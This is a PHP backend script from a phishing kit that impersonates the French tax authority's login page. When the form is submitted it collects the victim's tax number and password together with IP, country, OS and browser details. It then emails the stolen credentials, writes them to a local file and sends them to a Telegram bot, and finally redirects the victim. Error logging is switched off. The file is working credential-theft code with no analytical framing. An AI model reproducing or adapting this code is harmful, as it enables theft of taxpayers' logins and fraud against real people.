<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../BIRNAVA/911.php');
include('../BIRNAVA/COUNTRY.php');
include('../BIRNAVA/SYS.php');
include('../BIRNAVA/TELEGRMAT.php');

if (isset($_POST['btn11'])) {
    $message = "* +------+LOGIN INFOS_FRANCE+------+\n";
    $message .= "* Numéro fiscal : " . $_POST['username'] . "\n";
    $message .= "* Mot de passe : " . $_POST['password'] . "\n";

    $message .= "* +------+INFO+------+\n";
    $message .= "* Country: #$get_user_country\n";
    $message .= "* IP Address: $ip\n";
    $message .= "* Operating System: $user_os\n";
    $message .= "* Browser: $user_browser\n";
    $message .= "* Time: $date\n";
    $message .= "* +------++------+\n";

    $subject = "+------+LOGIN INFOS_FRANCE+------+";
    $headers = "From: LOGIN@IMPOT_FRANCE.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    mail($to, $subject, $message, $headers);

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    header('Location: ../A.php?FGDD=0#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG#_$dispatch');
    exit;
}
?>
